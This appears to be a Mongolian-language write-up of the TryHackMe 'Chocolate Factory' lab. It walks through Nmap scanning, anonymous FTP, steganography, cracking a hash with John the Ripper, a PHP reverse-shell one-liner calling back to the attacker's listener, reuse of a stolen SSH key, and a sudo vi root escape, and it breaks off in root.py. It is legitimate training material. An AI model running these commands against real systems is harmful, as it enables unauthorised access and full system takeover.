**Зорилтот систем:** Ubuntu Linux

# 1. УДИРТГАЛ

Орчин үеийн мэдээллийн технологийн системүүд нь сүлжээний үйлчилгээ, веб програм, хэрэглэгчийн бүртгэл, файл хадгалалт болон системийн эрхийн удирдлага зэрэг олон бүрэлдэхүүн хэсгээс тогтдог. Эдгээр бүрэлдэхүүн хэсгүүдийн аль нэгэнд буруу тохиргоо, сул нэвтрэлт танилт, нууц мэдээллийн хамгаалалт хангалтгүй байх зэрэг асуудал үүссэн тохиолдолд халдагч этгээд тухайн системд зөвшөөрөлгүй нэвтрэх, мэдээлэл олж авах, улмаар системийн удирдлагын эрхийг эзэмших эрсдэлтэй.

Энэхүү лабораторийн ажлын хүрээнд TryHackMe платформын Chocolate Factory нэртэй Linux суурьтай машины аюулгүй байдлыг үнэлж, гаднаас ил харагдах сүлжээний үйлчилгээнүүдийг илрүүлэх, тэдгээрээс мэдээлэл цуглуулах, олдсон нууц мэдээллийг шинжлэх, хэрэглэгчийн бүртгэлд нэвтрэх, улмаар системийн эрх мэдлийг ахиулж `root` түвшинд хүрэх ажиллагааг гүйцэтгэсэн.

Лабораторийн ажлыг Kali Linux орчноос эхлүүлж, зорилтот серверийн сүлжээний холболтыг шалгасны дараа Nmap ашиглан нээлттэй портууд болон үйлчилгээний хувилбаруудыг тодорхойлсон. Үүний дараа FTP үйлчилгээний anonymous нэвтрэлтийг ашиглан зураг файл татаж авч, Steganography аргаар уг зурагт нуугдсан мэдээллийг гарган авсан. Гаргаж авсан мэдээллийг Base64 кодчиллоос тайлж, Charlie хэрэглэгчийн нууц үгийн хэшэд хүрсэн. John the Ripper хэрэгслээр уг хэшийг offline password cracking аргаар шинжилж, хэрэглэгчийн нууц үгийг олсон.

Дараагийн шатанд веб үйлчилгээний команд ажиллуулах боломжийг ашиглан Reverse Shell холболт үүсгэж, `www-data` хэрэглэгчийн эрхээр зорилтот серверт нэвтэрсэн. Улмаар Charlie хэрэглэгчийн гэрийн хавтас дахь SSH хувийн түлхүүрийг илрүүлж, түүнийг Kali Linux систем рүү хуулан SSH холболт үүсгэсэн. Эцэст нь `sudo -l` командаар Charlie хэрэглэгчийн эрхийн тохиргоог шалгаж, `vi` програмын гаднын команд ажиллуулах боломжийг ашиглан root shell авсан. Root түвшинд хүрсний дараа `/root/root.py` скрипт дотор хадгалагдсан шифрлэгдсэн мэдээллийг өмнө олсон Fernet түлхүүрээр тайлж Root flag-ийг гарган авсан.

Энэхүү ажиллагаа нь нэг эмзэг байдлыг ашиглахаас илүүтэйгээр мэдээлэл цуглуулах, нууц мэдээлэл олж авах, хэрэглэгчийн эрхэд нэвтрэх, эрх ахиулах гэсэн олон үе шаттай халдлагын гинжин хэлхээг судлахад чиглэсэн.

# 2. ЛАБОРАТОРИЙН ЗОРИЛГО

## 2.1. Үндсэн зорилго

Chocolate Factory лабораторийн машины аюулгүй байдлыг нэвтрэлтийн туршилтын аргачлалаар үнэлж, зорилтот системд анхны хандалт авах болон хэрэглэгчийн эрхээс системийн администраторын эрх буюу `root` түвшинд хүрэх боломжийг илрүүлэх нь энэхүү ажлын үндсэн зорилго юм.

## 2.2. Дэд зорилтууд

1. Kali Linux болон зорилтот серверийн сүлжээний холболтыг шалгах.
2. Nmap ашиглан нээлттэй TCP портууд, ажиллаж буй үйлчилгээ болон үйлчилгээний хувилбаруудыг илрүүлэх.
3. FTP үйлчилгээний anonymous нэвтрэлтийн тохиргоог шалгах.
4. FTP серверээс татаж авсан зураг файлд Steganography шинжилгээ хийх.
5. Base64 кодчиллоор хадгалагдсан мэдээллийг тайлж хэрэглэгчийн нууц үгийн хэшийг олж авах.
6. John the Ripper ашиглан нууц үгийн хэшийг offline аргаар шалгах.
7. Веб програмын команд ажиллуулах боломжийг ашиглан Reverse Shell холболт үүсгэх.
8. Charlie хэрэглэгчийн SSH хувийн түлхүүрийг олж, SSH холболт үүсгэх.
9. `sudo -l` командаар эрхийн тохиргоог шинжлэх.
10. `vi` програмын shell escape боломжийг ашиглан root shell авах.
11. Fernet шифрлэлтийн түлхүүр ашиглан Root flag-ийг тайлах.

**Base64** – Base64 кодчиллоор хувиргасан текстэн мэдээллийг анхны байт мэдээлэл болгон буцаах арга.

**John the Ripper** – Нууц үгийн хэшүүдийг үгийн жагсаалтаар шалгах хэрэгсэл.

**Netcat (nc)** – Сүлжээний холболт хүлээн авах болон шалгах хэрэгсэл. Энэ лабораторид Reverse Shell холболт хүлээн авахад ашигласан.

**SSH** – Алсын Linux серверт шифрлэгдсэн холболтоор нэвтрэх протокол.

**vi** – Linux системийн текст засварлагч. Энэ лабораторид гаднын shell команд ажиллуулах боломжийг ашигласан.

# 4. ЛАБОРАТОРИЙН АЖЛЫН ГҮЙЦЭТГЭЛ

# 4.1. Зорилтот сервертэй сүлжээний холболт шалгах

Лабораторийн эхний шатанд Kali Linux системээс зорилтот сервертэй сүлжээний холболт байгаа эсэхийг шалгасан. Нэвтрэлтийн туршилтын үед зорилтот төхөөрөмжтэй холбогдох боломжгүй байхад порт скан хийх, үйлчилгээний мэдээлэл цуглуулах зэрэг дараагийн ажиллагааг гүйцэтгэх боломжгүй байдаг. Иймээс эхлээд ICMP протоколд суурилсан `ping` командыг ашигласан.

Ашигласан команд:

```bash
ping 10.113.174.10
```

Энэ командын `ping` хэсэг нь ICMP Echo Request пакет илгээж, зорилтот төхөөрөмжөөс ICMP Echo Reply хариу ирж байгаа эсэхийг шалгана. `10.113.174.10` нь лабораторийн зорилтот серверийн IP хаяг юм.

Туршилтын үр дүнд зорилтот серверээс хариу ирж, пакет алдагдал 0% байсан. Энэ нь Kali Linux болон зорилтот серверийн хооронд сүлжээний түвшинд холболт амжилттай байгааг харуулсан.

Мөн Kali Linux-ийн VPN интерфэйсийн IP хаяг дараах байдалтай байсан:

```text
tun0
192.168.196.54
```

Энэ IP хаягийг дараагийн Reverse Shell холболтод Kali Linux-ийн хүлээн авагч хаяг болгон ашигласан.

**Үр дүнгийн дүгнэлт:** Зорилтот сервертэй сүлжээний холболт байгаа нь батлагдсан тул дараагийн шатанд порт скан хийх боломж бүрдсэн.

# 4.2. Nmap ашиглан нээлттэй портууд болон үйлчилгээ илрүүлэх

## 4.2.1. Шинжилгээний зорилго

Серверийн сүлжээний үйлчилгээ нь халдлагын эхний боломжит цэгүүдийн нэг байдаг. Хэрэв тухайн сервер дээр FTP, SSH, HTTP зэрэг үйлчилгээ нээлттэй ажиллаж байвал тэдгээрийн тохиргоо болон хувилбарын мэдээллийг шинжилж, аюулгүй байдлын эрсдэлийг тодорхойлох боломжтой.

Иймээс зорилтот сервер дээр ямар TCP портууд нээлттэй байгааг болон тухайн портуудад ямар үйлчилгээ ажиллаж байгааг тодорхойлохын тулд Nmap хэрэгслийг ашигласан.

## 4.2.2. Ашигласан команд

```bash
nmap -sC -sS -sV 10.113.174.10
```

Командын параметрийн тайлбар:

- `nmap` – Сүлжээний скан хийх хэрэгсэл.
- `-sC` – Nmap-ийн үндсэн скриптүүдийг ажиллуулж үйлчилгээний талаар нэмэлт мэдээлэл цуглуулна.
- `-sS` – TCP SYN scan буюу TCP холболтыг бүрэн тогтоохгүйгээр SYN пакет ашиглан портын төлөвийг шалгана.
- `-sV` – Нээлттэй порт дээр ажиллаж буй үйлчилгээний хувилбарыг тодорхойлохыг оролдоно.
- `10.113.174.10` – Зорилтот серверийн IP хаяг.

## 4.2.3. Бодит үр дүн

Скан хийх явцад дараах гол портууд илэрсэн.

| Порт | Үйлчилгээ | Илэрсэн мэдээлэл |
|---|---|---|
| 21/tcp | FTP | vsftpd 3.0.5, anonymous нэвтрэлт зөвшөөрсөн |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | HTTP | Apache 2.4.41 |
| 100/tcp | Нэмэлт үйлчилгээ | Chocolate room гэсэн hint |
| 106/tcp | Нэмэлт үйлчилгээ | Chocolate room гэсэн hint |
| 109/tcp | Нэмэлт үйлчилгээ | Chocolate room гэсэн hint |
| 110/tcp | Нэмэлт үйлчилгээ | Chocolate room гэсэн hint |
| 111/tcp | Нэмэлт үйлчилгээ | Chocolate room гэсэн hint |
| 113/tcp | Ident | `/localhost/key_rev_key` гэсэн hint |

Nmap-ийн үр дүнгээс FTP, SSH болон HTTP гэсэн үндсэн гурван үйлчилгээг илрүүлсэн. Эдгээрээс FTP үйлчилгээ anonymous нэвтрэлтийг зөвшөөрч байгаа нь анхаарал татсан. Учир нь anonymous FTP тохиргоо нь хэрэглэгчийн нэр, нууц үг шаардахгүйгээр серверийн тодорхой файлд хандах боломж олгодог.

Мөн 113 дугаар портын үйлчилгээний мэдээлэлд `http://localhost/key_rev_key` гэсэн чиглүүлэх мэдээлэл буюу hint илэрсэн. Энэ мэдээлэл нь дараагийн шатанд `key_rev_key` файлыг судлах үндэслэл болсон.

**Үр дүнгийн дүгнэлт:** Зорилтот сервер дээр FTP, SSH, HTTP үйлчилгээнүүд нээлттэй байгааг тогтоосон. FTP anonymous нэвтрэлт болон 113 дугаар портын мэдээлэл нь дараагийн судалгааны гол чиглэл болсон.

# 4.3. key_rev_key файлаас нууц түлхүүр илрүүлэх

## 4.3.1. Шинжилгээний зорилго

Nmap скан хийх явцад 113 дугаар портын үйлчилгээний мэдээлэлд `http://localhost/key_rev_key` гэсэн hint илэрсэн. Энэ нь зорилтот систем дээр `key_rev_key` нэртэй файл байгааг илтгэж байсан тул уг файлыг олж авч агуулгыг нь шинжилсэн.

Бинар болон текстэн бус файлуудаас уншигдах тэмдэгт мөр гарган авахад `strings` хэрэгслийг ашигладаг. Энэ хэрэгсэл нь файлын доторх хэвлэх боломжтой ASCII тэмдэгтүүдийг ялган харуулдаг.

## 4.3.2. Ашигласан команд

```bash
strings key_rev_key
```

Командын параметрийн тайлбар:

- `strings` – Файлын доторх уншигдах тэмдэгт мөрүүдийг гаргаж авна.
- `key_rev_key` – Шинжилж буй файл.

## 4.3.3. Бодит үр дүн

Файлыг шинжлэхэд дараах түлхүүр гарч ирсэн:

```text
-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
```

Энэ утга нь Fernet шифрлэлтийн түлхүүрийн форматтай тохирч байсан бөгөөд лабораторийн төгсгөлд `/root/root.py` скриптэд ашиглагдсан.

**Үр дүнгийн дүгнэлт:** Зорилтот серверээс илэрсэн `key_rev_key` файлын дотор шифр тайлахад шаардлагатай түлхүүр хадгалагдаж байсныг тогтоосон. Энэ нь мэдээллийн нууцлал хангалтгүй байгааг харуулсан.

# 4.4. FTP anonymous нэвтрэлт ашиглан файл татаж авах

## 4.4.1. Шинжилгээний зорилго

Nmap-ийн үр дүнд FTP үйлчилгээ нээлттэй бөгөөд anonymous нэвтрэлтийг зөвшөөрч байгаа нь илэрсэн. FTP буюу File Transfer Protocol нь сүлжээгээр файл дамжуулахад ашиглагддаг протокол юм.

Anonymous FTP нь хэрэглэгчийн хувийн бүртгэл шаардахгүйгээр тодорхой файлд хандах боломж олгодог. Хэрэв серверийн администратор файлын хандалтыг зөв хязгаарлаагүй бол гаднын этгээд дотоод мэдээлэл, тохиргооны файл эсвэл бусад нууц өгөгдлийг татаж авах эрсдэлтэй.

## 4.4.2. Ашигласан командууд

```bash
ftp 10.113.174.10
```

Энэ команд нь зорилтот серверийн FTP үйлчилгээнд холбогдоно.

Нэвтрэх үед:

```text
Name: anonymous
```

гэж оруулж anonymous хэрэглэгчээр нэвтэрсэн.

Дараа нь:

```bash
ls
```

командыг ашиглан FTP серверийн одоогийн хавтас дахь файлуудыг жагсаасан.

Үр дүнд `gum_room.jpg` нэртэй зураг файл илэрсэн.

Файлыг татахдаа:

```bash
get gum_room.jpg
```

командыг ашигласан.

`get` команд нь FTP серверээс локал Kali Linux систем рүү файл татаж авах зориулалттай.

## 4.4.3. Бодит үр дүн

`gum_room.jpg` файлыг амжилттай татаж авсан. Файлын хэмжээ 208838 байт байсан.

**Үр дүнгийн дүгнэлт:** FTP серверийн anonymous нэвтрэлтийн тохиргоогоор дамжуулан зураг файлд хандах боломжтой байсныг тогтоосон. Татаж авсан зураг нь дараагийн Steganography шинжилгээний үндсэн объект болсон.

# 4.5. Steganography ашиглан зураг доторх мэдээллийг гаргаж авах

## 4.5.1. Онолын тайлбар

Steganography буюу мэдээлэл нуух арга нь нэг төрлийн файл дотор өөр мэдээллийг ил харагдахгүй байдлаар хадгалах технологи юм. Жишээлбэл, зураг файл дотор текст, нууц түлхүүр, файл эсвэл бусад өгөгдлийг нууж болно.

Энэ арга нь Cryptography буюу шифрлэлтийн аргуудаас ялгаатай. Шифрлэлтийн үед мэдээлэл байгаа нь мэдэгдэж болох боловч агуулгыг унших боломжгүй болдог. Харин Steganography нь мэдээлэл өөрөө байгаа гэдгийг илрүүлэхэд хүндрэл учруулах зорилготой.

Энэ лабораторид FTP-ээс татсан `gum_room.jpg` зураг файл дотор нуугдсан мэдээлэл байгаа эсэхийг шалгахын тулд `steghide` хэрэгслийг ашигласан.

## 4.5.2. Ашигласан команд

```bash
steghide extract -sf gum_room.jpg
```

Командын параметрийн тайлбар:

- `steghide` – Steganography шинжилгээний хэрэгсэл.
- `extract` – Файл дотор нуусан өгөгдлийг гаргаж авах үйлдэл.
- `-sf` – Steghide-ийн source file буюу эх файл заана.
- `gum_room.jpg` – Шинжилж буй зураг файл.

## 4.5.3. Бодит үр дүн

Командыг ажиллуулсны дараа зураг дотор нуугдсан `b64.txt` нэртэй файл амжилттай гаргаж авсан.

Дараагийн удаа ижил командыг дахин ажиллуулахад өгөгдөл аль хэдийн гаргаж авсан тул дахин extract хийх боломжгүй болсон. Энэ нь эхний удаагийн ажиллагаа амжилттай болсны дараах нөхцөл байв.

`b64.txt` файл дотор Base64 кодчиллоор хувиргасан текстэн мэдээлэл хадгалагдаж байсан.

**Үр дүнгийн дүгнэлт:** Зураг файлд ил харагдахгүй нууц мэдээлэл байсныг Steganography аргаар илрүүлж, тусдаа текст файл болгон гарган авсан.

# 4.6. Base64 кодчилсон мэдээллийг тайлах

## 4.6.1. Онолын тайлбар

Base64 нь хоёртын өгөгдлийг текстэн тэмдэгтүүдийн хэлбэрээр илэрхийлэх кодчиллын арга юм. Энэ нь шифрлэлтийн алгоритм биш бөгөөд нууцлал хангадаггүй. Base64 кодчилсон мэдээллийг тохирох decode үйлдлээр анхны өгөгдөл болгон буцааж болно.

Энэ лабораторид Steganography аргаар гаргаж авсан `b64.txt` файлын мэдээллийг тайлахад Base64 decode арга ашигласан.

## 4.6.2. Үр дүн

Base64 кодчилсон мэдээллийг тайлсны дараа Linux системийн хэрэглэгчийн нууц үгийн мэдээлэлтэй төстэй мөрүүд илэрсэн. Тэдгээрийн дотор Charlie хэрэглэгчийн нууц үгийн хэш байсан.

Linux системд хэрэглэгчийн нууц үгийн хэшүүд `/etc/shadow` файлд хадгалагддаг. Тус файл нь нууц үгийн мэдээллийг энгийн текст хэлбэрээр бус, хэш хэлбэрээр хадгалдаг бөгөөд зөвхөн эрх бүхий хэрэглэгч унших боломжтой байхаар хамгаалагдсан байдаг.

Энэ лабораторид хэшийн мэдээлэл зураг дотор нуугдсан файлаар дамжин ил болсон нь нууц мэдээллийг файлд хадгалах болон түгээх үеийн хамгаалалт хангалтгүй байсныг харуулсан.

**Техникийн тэмдэглэл:** Base64 decode хийхэд ашигласан яг командын мөр болон Charlie-ийн хэшийн бүрэн утга энэ тайланд хадгалагдсан бодит командын мэдээлэлд бүрэн байхгүй тул зохиомлоор нөхөж оруулаагүй.

# 4.7. John the Ripper ашиглан Charlie хэрэглэгчийн нууц үгийг илрүүлэх

## 4.7.1. Онолын тайлбар

Linux системд хэрэглэгчийн нууц үгийг шууд хадгалахгүй, харин криптограф хэш болгон хувиргаж хадгалдаг. Хэш нь өгөгдлийг тогтмол урттай утга болгон хувиргах нэг чиглэлт функцийн үр дүн юм.

Нууц үгийн хэш олдсон тохиолдолд түүнийг буцаан тайлахын оронд таамагласан нууц үг бүрийг ижил хэш алгоритмаар хувиргаж, хадгалагдсан хэштэй харьцуулдаг. Үүнийг offline password cracking гэж нэрлэдэг.

Энэ лабораторид Charlie хэрэглэгчийн хэш нь SHA-512 Crypt форматтай байсан тул John the Ripper хэрэгслийг ашигласан.

## 4.7.2. Хэшийн файл бэлтгэх

Charlie хэрэглэгчийн хэшийн мөрийг `charlie_hash.txt` файлд хадгалсан.

## 4.7.3. Ашигласан команд

```bash
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt charlie_hash.txt
```

Командын параметрийн тайлбар:

- `john` – John the Ripper нууц үг шалгах хэрэгсэл.
- `--format=sha512crypt` – Хэшийн төрлийг SHA-512 Crypt гэж заана.
- `--wordlist=/usr/share/wordlists/rockyou.txt` – Шалгах нууц үгсийн жагсаалтын байршлыг заана.
- `charlie_hash.txt` – Шинжлэх хэрэглэгчийн хэш агуулсан файл.

Эхний ажиллагааны үед John the Ripper-ийн процесс тасалдсан. Үүний дараа өмнөх ажиллагааг үргэлжлүүлэхийн тулд дараах командыг ашигласан.

```bash
john --restore
```

`--restore` параметр нь өмнөх ажиллагааны хадгалсан төлөвөөс үргэлжлүүлэн ажиллуулах зориулалттай.

## 4.7.4. Бодит үр дүн

John the Ripper-ийн үр дүнд Charlie хэрэглэгчийн нууц үг дараах байдлаар илэрсэн:

```text
cn7824
```

Энэ нууц үгийг дараагийн шатанд веб системд Charlie хэрэглэгчээр нэвтрэхэд ашигласан.

**Үр дүнгийн дүгнэлт:** Хэрэглэгчийн нууц үгийн хэш болон нийтэд түгээмэл үгийн жагсаалтыг ашиглан Charlie хэрэглэгчийн нууц үгийг offline аргаар олсон. Энэ нь таахад хялбар, сул нууц үг ашиглах нь системийн аюулгүй байдалд ноцтой эрсдэл үүсгэдгийг харуулсан.

# 4.8. Веб үйлчилгээний шинжилгээ ба Reverse Shell холболт үүсгэх

## 4.8.1. Веб үйлчилгээний шинжилгээ

Nmap-ийн үр дүнд 80 дугаар порт дээр Apache HTTP үйлчилгээ ажиллаж байсан. Иймээс браузераар дараах хаягаар зорилтот веб серверт хандсан:

```text
http://10.113.174.10
```

Charlie хэрэглэгчийн өмнө олсон нууц үгийг ашиглан веб системд нэвтэрсэн.

Веб интерфэйсийн команд ажиллуулах боломжийг ашиглан сервер дээр команд гүйцэтгэх нөхцөл бүрдсэн. Энэ төрлийн асуудал нь веб програмын оролтын утгыг аюулгүй шалгахгүйгээр системийн команд руу дамжуулснаас үүсдэг эрсдэлтэй холбоотой.

## 4.8.2. Reverse Shell-ийн онолын тайлбар

Reverse Shell гэдэг нь зорилтот сервер өөрөө халдагчийн хяналттай төхөөрөмж рүү сүлжээний холболт үүсгэж, интерактив командын shell дамжуулах арга юм.

Энгийн холболтын үед хэрэглэгч сервер рүү холбогддог бол Reverse Shell-ийн үед зорилтот сервер халдагчийн сонсож буй порт руу холболт эхлүүлдэг.

Энэ лабораторид Kali Linux системийн VPN IP `192.168.196.54`, хүлээн авах порт `1234` байсан.

## 4.8.3. Netcat listener эхлүүлэх

Kali Linux терминал дээр:

```bash
nc -lvnp 1234
```

Командын параметрийн тайлбар:

- `nc` – Netcat хэрэгсэл.
- `-l` – Холболт хүлээн авах горимд ажиллуулна.
- `-v` – Холболтын мэдээллийг дэлгэрэнгүй харуулна.
- `-n` – DNS нэрийн орчуулга хийхгүй, IP хаягаар ажиллана.
- `-p 1234` – 1234 дугаар портыг сонсохоор тохируулна.

## 4.8.4. Веб интерфэйсээр Reverse Shell үүсгэх

Вебийн команд ажиллуулах талбарт дараах PHP командыг оруулсан:

```bash
php -r '$sock=fsockopen("192.168.196.54",1234);exec("/bin/bash -i <&3 >&3 2>&3");'
```

Командын үндсэн ажиллагаа:

- `php -r` – PHP кодыг тусдаа файл үүсгэлгүйгээр шууд ажиллуулна.
- `fsockopen()` – Заасан IP болон порт руу сүлжээний холболт үүсгэнэ.
- `192.168.196.54` – Kali Linux системийн VPN IP.
- `1234` – Netcat listener ажиллаж буй порт.
- `exec()` – Системийн команд ажиллуулна.
- `/bin/bash -i` – Интерактив Bash shell эхлүүлнэ.
- `<&3 >&3 2>&3` – Shell-ийн оролт, гаралт болон алдааны урсгалыг сүлжээний холболттой холбох зориулалттай.

## 4.8.5. Бодит үр дүн

Kali Linux-ийн Netcat listener дээр зорилтот серверээс холболт ирсэн.

```text
listening on [any] 1234 ...
connect to [192.168.196.54] from (UNKNOWN) [10.113.174.10] 45348
```

Дараа нь зорилтот системийн shell нээгдэж:

```text
www-data@ip-10-113-174-10:/var/www/html$
```

гэсэн prompt гарсан.

Хэрэглэгчийн эрхийг шалгахад:

```bash
whoami
```

Үр дүн:

```text
www-data
```

Мөн:

```bash
id
```

командыг ажиллуулахад:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root),27(sudo),108(lxd)
```

гэсэн үр дүн гарсан.

Энд `www-data` нь веб серверийн процессууд ажиллахад зориулагдсан системийн хэрэглэгч юм. Түүний бүлгүүдийн жагсаалтад `root`, `sudo`, `lxd` гэсэн бүлгүүд харагдсан боловч бүлгийн гишүүн байх нь тухайн хэрэглэгч автоматаар root эрхтэй гэсэн үг биш юм.

**Үр дүнгийн дүгнэлт:** Веб програмын команд ажиллуулах боломжийг ашиглан Reverse Shell холболт амжилттай үүсгэж, `www-data` хэрэглэгчийн эрхээр зорилтот серверт хандсан.

# 4.9. Charlie хэрэглэгчийн гэрийн хавтсыг шинжлэх

## 4.9.1. Шинжилгээний зорилго

`www-data` эрхээр серверт нэвтэрсний дараа бусад хэрэглэгчийн файл болон SSH түлхүүр зэрэг мэдээллийг шалгасан. Linux системд хэрэглэгч бүр өөрийн гэрийн хавтастай байдаг бөгөөд тухайн хавтас дахь файлын эрхээс шалтгаалан бусад хэрэглэгчид хандах боломж өөр өөр байна.

Charlie хэрэглэгчийн гэрийн хавтас руу шилжсэн:

```bash
cd /home/charlie
```

Дараа нь хавтас дахь бүх файл, далд файл болон эрхийн мэдээллийг харахын тулд:

```bash
ls -la
```

командыг ашигласан.

## 4.9.2. Бодит үр дүн

Хавтас дотор дараах файлууд илэрсэн:

- `teleport`
- `teleport.pub`
- `user.txt`

`teleport` файл нь RSA хувийн түлхүүрийн агуулгатай байсан. `teleport.pub` нь түүнд харгалзах нийтийн түлхүүр байв.

`user.txt` файлыг `www-data` эрхээр унших гэж оролдоход:

```text
Permission denied
```

гэсэн алдаа гарсан.

Энэ нь Linux-ийн файл болон хавтасны эрхийн хяналт ажиллаж байгааг харуулсан. `www-data` хэрэглэгч тухайн файлыг унших эрхгүй байсан тул User flag-ийг шууд авч чадаагүй.

## 4.9.3. SSH хувийн түлхүүрийг ашиглах

`teleport` файл доторх RSA хувийн түлхүүрийг Kali Linux систем рүү хуулж, `teleport_key` нэртэй файлд хадгалсан.

SSH хувийн түлхүүрийг бусад хэрэглэгч унших боломжгүй байхаар эрхийг тохируулсан:

```bash
chmod 600 teleport_key
```

Энэ командын `chmod` нь файлын эрхийг өөрчилнө. `600` нь файлын эзэмшигч унших, бичих эрхтэй, бусад хэрэглэгчид ямар ч эрхгүй гэсэн утгатай.

Дараа нь SSH холболт үүсгэсэн:

```bash
ssh -i teleport_key charlie@10.113.174.10
```

Параметрийн тайлбар:

- `ssh` – Secure Shell холболт үүсгэх хэрэгсэл.
- `-i teleport_key` – Нэвтрэхэд ашиглах хувийн түлхүүрийн файлыг заана.
- `charlie` – Нэвтрэх хэрэглэгчийн нэр.
- `10.113.174.10` – Зорилтот серверийн IP хаяг.

## 4.9.4. Бодит үр дүн

SSH холболт амжилттай үүсэж Charlie хэрэглэгчийн shell нээгдсэн.

```bash
whoami
```

Үр дүн:

```text
charlie
```

Дараа нь:

```bash
id
```

командын үр дүн:

```text
uid=1000(charlie) gid=1000(charley) groups=1000(charley),0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

Энэ үр дүнгээс Charlie хэрэглэгчийн UID нь 1000 бөгөөд тухайн хэрэглэгч `sudo`, `lxd` зэрэг бүлгийн гишүүн байгааг харж болно.

**Үр дүнгийн дүгнэлт:** `www-data` хэрэглэгчийн эрхээс Charlie хэрэглэгчийн SSH хувийн түлхүүрийг ашиглан илүү өндөр эрхтэй хэрэглэгчийн бүртгэлд амжилттай нэвтэрсэн.

# 4.10. User flag авах

Charlie хэрэглэгчээр SSH холболт үүсгэсний дараа түүний гэрийн хавтас руу шилжсэн.

Файлын жагсаалтыг шалгасан:

`cat` команд нь текстэн файлын агуулгыг терминалд хэвлэдэг.

**Үр дүнгийн дүгнэлт:** Charlie хэрэглэгчийн эрхээр User flag-д хүрэх боломж бүрдсэн нь хэрэглэгчийн түвшний нэвтрэлт амжилттай болсныг баталсан.

# 4.11. sudo -l ашиглан эрхийн тохиргоог шалгах

## 4.11.1. Шинжилгээний зорилго

Linux системд `sudo` нь эрх бүхий хэрэглэгчдэд тодорхой командыг өөр хэрэглэгчийн, ихэвчлэн root хэрэглэгчийн эрхээр ажиллуулах боломж олгодог механизм юм.

Хэрэв `sudoers` тохиргоонд хэт өргөн эрх олгосон бол хэрэглэгч зөвшөөрөгдсөн програмын нэмэлт боломжийг ашиглан системийн эрхийг ахиулах эрсдэлтэй.

Иймээс Charlie хэрэглэгч ямар командыг `sudo` ашиглан ажиллуулах боломжтойг шалгасан.

## 4.11.2. Ашигласан команд

```bash
sudo -l
```

`sudo -l` команд нь одоогийн хэрэглэгчийн `sudo` ашиглан ажиллуулах эрхтэй командууд болон холбогдох тохиргоог харуулна.

## 4.11.3. Бодит үр дүн

Терминалд дараах үр дүн гарсан:

```text
Matching Defaults entries for charlie on ip-10-113-174-10:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on ip-10-113-174-10:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

Үр дүнгийн тайлбар:

- `env_reset` – `sudo` ажиллах үед орчны хувьсагчдыг тодорхой хэмжээнд цэвэрлэнэ.
- `mail_badpass` – Буруу нууц үг оруулсан тохиолдолд мэдэгдэл илгээх тохиргоо.
- `secure_path` – `sudo` ашиглан команд ажиллуулах үед ашиглах PATH зам.
- `NOPASSWD` – Тухайн командыг ажиллуулахдаа нууц үг шаардахгүй.
- `/usr/bin/vi` – Charlie хэрэглэгчид `sudo` ашиглан ажиллуулах эрх олгосон програм.

Энэ үр дүнгээс Charlie хэрэглэгч `vi` текст засварлагчийг нууц үггүй ажиллуулах боломжтой байгааг тогтоосон.

`vi` нь текст засварлах үндсэн үүргээс гадна гаднын команд ажиллуулах боломжтой. Иймээс зөвхөн текст засварлагч ажиллуулах эрх олгосон мэт харагдавч бодит байдал дээр системийн shell ажиллуулах эрсдэл үүссэн.

# 4.12. vi ашиглан root эрх авах

## 4.12.1. Эмзэг байдлын онолын тайлбар

Linux системийн зарим програм нь үндсэн үүргээс гадна гаднын команд ажиллуулах нэмэлт боломжтой байдаг. `vi` текст засварлагчийн хувьд `:` командын горимд `!` тэмдэгт ашиглан shell команд ажиллуулах боломжтой.

Хэрэв ийм програмыг root эрхээр ажиллуулах зөвшөөрөл буруу олгогдсон бол тухайн програмын гаднын команд ажиллуулах боломж нь системийн өндөр эрхтэй shell нээхэд хүргэж болзошгүй.

Энэ лабораторид `sudo -l` командаар `vi` програмд олгосон эрхийг илрүүлж, Write-up-д дурдсан shell escape аргыг ашигласан.

## 4.12.2. Эхний оролдлого ба алдаа

Эхний удаа дараах командыг ухаалаг хашилт ашиглан ажиллуулсан:

```bash
sudo /usr/bin/vi -c ‘:!/bin/sh’ /dev/null
```

Үр дүнд:

```text
-bash: !/bin/sh’: event not found
```

гэсэн алдаа гарсан.

Энэ алдаа нь Bash-ийн history expansion буюу өмнөх командын түүхтэй холбоотой `!` тэмдэгтийн боловсруулалтаас үүссэн. Мөн командын эхлэл, төгсгөлд энгийн ASCII хашилтын оронд ухаалаг хашилт ашигласан байсан.

## 4.12.3. Зассан команд

Энгийн хашилт ашиглан дараах командыг ажиллуулсан:

```bash
sudo /usr/bin/vi -c ':!/bin/sh' /dev/null
```

Параметрийн тайлбар:

- `sudo` – Зөвшөөрөгдсөн командыг өндөр эрхээр ажиллуулна.
- `/usr/bin/vi` – Ажиллуулах програмын бүрэн зам.
- `-c` – `vi` эхлэх үед заасан командыг шууд гүйцэтгэнэ.
- `':!/bin/sh'` – `vi`-ийн командын горимоор `/bin/sh` shell эхлүүлэхийг заана.
- `/dev/null` – Засварлах бодит файл шаардлагагүй тул ашигласан тусгай төхөөрөмжийн файл.

## 4.12.4. Бодит үр дүн

Командыг зөв хашилттай ажиллуулсны дараа shell нээгдсэн.

Эрхийг шалгахын тулд:

```bash
whoami
```

Үр дүн:

```text
root
```

Дараа нь:

```bash
id
```

Үр дүн:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Энэ нь shell процесс root хэрэглэгчийн UID 0 эрхээр ажиллаж байгааг баталсан.

**Үр дүнгийн дүгнэлт:** `vi` програмд олгосон `sudo` зөвшөөрлийн нэмэлт боломжийг ашиглан системийн root shell-д амжилттай хүрсэн.

# 4.13. Root flag хадгалсан root.py файлыг шинжлэх

## 4.13.1. Root хавтас руу нэвтрэх

Root эрх авсны дараа системийн root хэрэглэгчийн гэрийн хавтас руу шилжсэн.

```bash
cd /root
```

Дараа нь хавтас дахь файлуудыг жагсаасан:

```bash

```

Үр дүнд:

```text
root.py

```

гэсэн файлууд харагдсан.

## 4.13.2. root.py файлын агуулгыг шалгах

```bash
cat root.py
```

Файлын гол код дараах бүтэцтэй байсан:

```python
from cryptography.fernet import Fernet
import pyfiglet

key=input("Enter the key:  ")
f=Fernet(key)

encrypted_mess = '...'

